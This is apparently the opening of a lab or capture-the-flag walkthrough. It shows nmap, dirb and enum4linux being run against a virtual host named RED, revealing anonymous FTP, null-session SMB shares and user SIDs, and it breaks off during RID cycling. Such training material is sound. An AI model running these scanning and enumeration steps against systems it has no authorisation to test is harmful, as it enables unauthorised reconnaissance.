Reconnaissance:

Started by finding the host on the network.

nmap -sS -O 192.168.118.0/24

192.168.118.184 looks guilty.

Enumeration:

root@kali:~# nmap -A -T4 192.168.118.184

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-19 14:56 MDT
Nmap scan report for 192.168.118.184
Host is up (0.00056s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE     VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
53/tcp   open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp   open   http
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 568
|     <!doctype html><html><head><title>404 Not Found</title><style>
|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; }
|     padding-left: 10px; }
|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
|     </style>
|     </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/nice%20ports%2C/Tri%6Eity.txt%2ebak</code> was not found on this server.</p></body></html>
|   GetRequest, HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 533
|     <!doctype html><html><head><title>404 Not Found</title><style>
|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; }
|     padding-left: 10px; }
|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
|     </style>
|_    </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/</code> was not found on this server.</p></body></html>
|_http-title: 404 Not Found
139/tcp  open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   doom?
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, InteractiveClient, IgnoreSigpipes, SupportsTransactions, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsCompression, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, FoundRows, LongColumnFlag, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: m';gA5'p+\x1C\x0Dx\x17hLo3.C"
|_  Auth Plugin Name: 88
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.40%I=7%D=5/19%Time=591F5C0A%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533
SF:\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</title
SF:><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#3333
SF:33;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5e
SF:m;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-h
SF:eight:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20bla
SF:ck;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}
SF:\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monosp
SF:ace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</h1
SF:><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x20
SF:was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(HTT
SF:POptions,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x205
SF:33\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</tit
SF:le><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#33
SF:3333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.
SF:5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min
SF:-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20b
SF:lack;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x2
SF:0}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:mono
SF:space;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</
SF:h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x
SF:20was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(F
SF:ourOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Leng
SF:th:\x20568\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Fo
SF:und</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color
SF::\x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size
SF::\x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc
SF:;\x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20in
SF:set\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x20
SF:10px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-fam
SF:ily:monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x2
SF:0Found</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/n
SF:ice%20ports%2C/Tri%6Eity\.txt%2ebak</code>\x20was\x20not\x20found\x20on
SF:\x20this\x20server\.</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port666-TCP:V=7.40%I=7%D=5/19%Time=591F5C04%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2000,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 00:0C:29:9F:89:C4 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2017-05-19T21:56:56+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.118.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.51 seconds

root@kali:~# dirb http://192.168.118.184

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 19 15:00:32 2017
URL_BASE: http://192.168.118.184/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.118.184/ ----
+ http://192.168.118.184/.bashrc (CODE:200|SIZE:3771)                                                                  
+ http://192.168.118.184/.profile (CODE:200|SIZE:675)                                                                  

-----------------
END_TIME: Fri May 19 15:00:36 2017
DOWNLOADED: 4612 - FOUND: 2

root@kali:~# nmap --script http-methods -p 80 192.168.118.184

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-19 15:01 MDT
Nmap scan report for 192.168.118.184
Host is up (0.00032s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 00:0C:29:9F:89:C4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
root@kali:~#

root@kali:~# enum4linux 192.168.118.184
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 19 15:05:48 2017

 ==========================
|    Target Information    |
 ==========================
Target ........... 192.168.118.184
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =======================================================
|    Enumerating Workgroup/Domain on 192.168.118.184    |
 =======================================================
[+] Got domain/workgroup name: WORKGROUP

 ===============================================
|    Nbtstat Information for 192.168.118.184    |
 ===============================================
Looking up status of 192.168.118.184
	RED             <00> -         H <ACTIVE>  Workstation Service
	RED             <03> -         H <ACTIVE>  Messenger Service
	RED             <20> -         H <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ========================================
|    Session Check on 192.168.118.184    |
 ========================================
[+] Server 192.168.118.184 allows sessions using username '', password ''

 ==============================================
|    Getting domain SID for 192.168.118.184    |
 ==============================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =========================================
|    OS information on 192.168.118.184    |
 =========================================
[+] Got OS info for 192.168.118.184 from smbclient: Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
[+] Got OS info for 192.168.118.184 from srvinfo:
	RED            Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ================================
|    Users on 192.168.118.184    |
 ================================
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ============================================
|    Share Enumeration on 192.168.118.184    |
 ============================================
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

	Server               Comment
	---------            -------
	RED                  red server (Samba, Ubuntu)

	Workgroup            Master
	---------            -------
	WORKGROUP            RED

[+] Attempting to map shares on 192.168.118.184
//192.168.118.184/print$	Mapping: DENIED, Listing: N/A
//192.168.118.184/kathy	Mapping: OK, Listing: OK
//192.168.118.184/tmp	Mapping: OK, Listing: OK
//192.168.118.184/IPC$	Mapping: OK	Listing: DENIED

 =======================================================
|    Password Policy Information for 192.168.118.184    |
 =======================================================
[E] Unexpected error from polenum:
Traceback (most recent call last):
  File "/usr/bin/polenum", line 33, in <module>
    from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr
ImportError: cannot import name dcerpc_v4
[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =================================
|    Groups on 192.168.118.184    |
 =================================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ==========================================================================
|    Users on 192.168.118.184 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-864226560-67800430-3082388513
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''
S-1-5-21-864226560-67800430-3082388513-500 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)
S-1-5-21-864226560-67800430-3082388513-502 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-503 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-504 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-505 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-506 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-507 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-508 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-509 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-510 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-511 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-512 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)
S-1-5-21-864226560-67800430-3082388513-514 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-515 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-516 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-517 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-518 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-519 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-520 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-521 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-522 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-523 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-524 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-525 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-526 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-527 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-528 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-529 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-530 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-531 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-532 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-533 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-534 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-535 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-536 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-537 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-538 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-539 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-540 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-541 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-542 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-543 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-544 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-545 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-546 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-547 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-548 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-549 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-550 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1000 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1001 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1002 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1003 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1004 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1005 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1006 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1007 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1008 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1009 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1010 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1011 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1012 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1013 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1014 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1015 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1016 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1017 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1018 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1019 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1020 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1021 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1022 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1023 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1024 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1025 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1026 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1027 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1028 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1029 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1030 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1031 *unknown*\*unknown* (8)
